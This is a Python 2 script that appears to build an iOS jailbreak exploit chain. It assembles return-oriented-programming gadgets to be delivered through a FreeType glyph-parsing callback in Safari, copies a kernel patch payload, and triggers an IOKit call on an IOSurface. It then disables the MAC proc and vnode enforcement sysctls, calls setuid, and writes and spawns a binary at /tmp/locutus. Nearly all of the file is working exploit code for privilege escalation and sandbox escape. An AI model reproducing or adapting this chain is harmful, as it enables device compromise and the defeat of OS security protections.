#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib
import dmini
from world1 import *
import goo
import cPickle as pickle

if len(sys.argv) != 5:
    print >> sys.stderr, "usage: python catalog.py dejavu|two cache kern patchfile"
    sys.exit(1)

mode, cachefile, kernfile, patchfile = sys.argv[1:]
assert mode in ['dejavu', 'two']
patchfp = open(patchfile)

stack43 = False # XXX

def read(f, size):
    result = f.read(size)
    if len(result) != size: raise Exception('truncated')
    return result

def dbg_result():
    # ensure that all of these are 0!
    if False:
        result, resultp = stackunkpair()
        store_r0_to(resultp)
        back = sys._getframe().f_back
        funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)

dmini.init(kernfile, False)

proc_ucred = dmini.cur.sym('_proc_ucred')
weirdfile = Connection('kcode.o', False).nth_segment(0)[:-4] + struct.pack('I', proc_ucred)
while True:
    namelen = patchfp.read(4)
    if len(namelen) == 0: break
    if len(namelen) != 4: raise Exception('truncated')
    name = read(patchfp, struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', read(patchfp, 4))
    data = read(patchfp, struct.unpack('I', read(patchfp, 4))[0])
    if name == 'sysent patch':
        sysent_patch, = struct.unpack('I', data)
    elif name == 'sysent patch orig':
        sysent_patch_orig, = struct.unpack('I', data)
    elif name == 'scratch':
        scratch, = struct.unpack('I', data)
    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
        continue
    weirdfile += struct.pack('II', addr, len(data)) + data
weirdfile += struct.pack('IIII', sysent_patch, 4, sysent_patch_orig, 0)

#set_fwd('PC0', dmini.cur.find_basic('- 00 f0 96 e8')) # ldm r6, {ip, sp, lr, pc}
#set_fwd('PC0', dmini.cur.find_basic('- 00 f0 b4 e9')) # ldm r4!, {ip, sp, lr, pc}

init('PC')
make_avail()
code_addr = 0x80000400 # xxx
funcall('_memcpy', code_addr, ptr(weirdfile), len(weirdfile))
set_fwd('PC', code_addr)
kstuff = finalize(0x1000)
assert len(kstuff) < 0x1000

dmini.init(cachefile, True)

def wrap(num):
    if (num & 0xf0000000) == 0x30000000:
        return reloc(3, num, alignment=0x1000)
    else:
        return num
dmini.cur.wrap = wrap

if mode == 'dejavu':
    init('R4', 'R5', 'PC')
    make_r7_avail()
    m = pointed('')
    set_sp_to(pointer(m))
    heapadd(m)
    heapadd(fwd('R7'), fwd('PC'))
else:
    initializer, cmdstuff = init_with_initializer_stub()
make_avail()

funcall('_abort')

if mode == 'dejavu':
    load_r0_from(reloc(0xe, 0x558))
    load_r0_r0()
    zlocutusp, zlocutuspp = stackunkpair()
    store_r0_to(zlocutuspp)
    add_r0_by(reloc(0xc, 0))
    zplistp, zplistpp = stackunkpair()
    store_r0_to(zplistpp)
    mtss_count = 9
else:
    mtss_count = 5

mtss = []
for i in xrange(mtss_count):
    mts, mtsp = stackunkpair()
    store_r0_to(mtsp)
    mtss.append(mts)

protp = ptrI(0)
zerop = ptrI(0)
p_2000 = ptrI(0x2000)

if mode == 'dejavu':
    # before we remap, save 0x1000 so we can have it back
    # only required in Safari
    funcall('_mach_task_self')

    sizep = ptrI(0x1000)
    memory_entry, memory_entryp = stackunkpair()
    funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()

funcall('_vm_deallocate', mtss.pop(), 0x1000, 0x1000); dbg_result()


funcall('_vm_allocate', mtss.pop(), 0x1000, 0x1000, 0); dbg_result()
funcall('_memcpy', 0x1000, ptr(kstuff), len(kstuff))

funcall('_mlock', 0x1000, 0x1000); dbg_result()

w, h = 1, 0x1000
funcall('_IOSurfaceWrapClientImage', 0x41424752, w, h, 4, 4*w*h, 0)
dbg_result(); funcall('_abort')
surface, surfacep = stackunkpair()
store_r0_to(surfacep)
funcall('_IOSurfaceGetID', None)
surface_id, surface_idp = stackunkpair()
store_r0_to(surface_idp)

if mode == 'two':
    # XXX is this necessary? it's from star
    funcall('_IOKitWaitQuiet', 0, ptrI(0, 0, 0))

# XXX
funcall('_IOServiceMatching', ptr('AppleRGBOUT', True))
connect = ptrI(0)
funcall('_IOServiceOpen', None, mtss.pop(), 0, connect); dbg_result()
js = ptrI(surface_id, 0, 6, 0)
funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)

# do some housekeeping
# (but don't bother if we're going to exec)
if mode == 'dejavu':
    funcall('_CFRelease', surface)
    funcall('_IOSurfaceClose', connect, load_r0=True)

    funcall('_munlock', 0, 0x2000); dbg_result()
    funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
    funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0); dbg_result()
    funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0); dbg_result()
    funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2); dbg_result()

    # the boring stuff

    O_WRONLY = 0x0001
    O_CREAT  = 0x0200
    O_TRUNC  = 0x0400

    funcall('_malloc', reloc(0xa, 0))
    locutusp, locutuspp = stackunkpair()
    store_r0_to(locutuspp)
    dmini.cur.push_file('/usr/lib/libz.dylib')
    funcall('_uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0))
    dmini.cur.pop_file()
    dbg_result()
    locutus_str = ptr('/tmp/locutus', True)
    funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
    fd, fdp = stackunkpair()
    store_r0_to(fdp)
    #dbg_result()
    funcall('_write', None, locutusp, reloc(0xb, 0))
    dbg_result()
    funcall('_close', fd)
    dbg_result()
    funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
    dbg_result()

funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
dbg_result()

if mode == 'dejavu':
    funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
    dbg_result()
    funcall('_geteuid')
    funcall('_setuid', None); dbg_result()

    #funcall('_printf', ptr('done with shellcode\n', True))

    set_r0_to(1337)
    fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment

    final = finalize(reloc(0xd, 0))

    heapdump(final)

    # add sp, #400; pop {r4, r5, pc}
    parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
    print hex(parse_callback)
    dmini.cur.push_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
    actual_parse_callback = dmini.cur.private_sym('_T1_Parse_Glyph').value

    final = final.unpack()

    open('dejavu.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'plist': zplist}))
else:
    funcall('_execl', '/sbin/launchd.real', '/sbin/launchd')
    final = finalize(reloc(0, 0))
    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'cmdstuff': cmdstuff}))
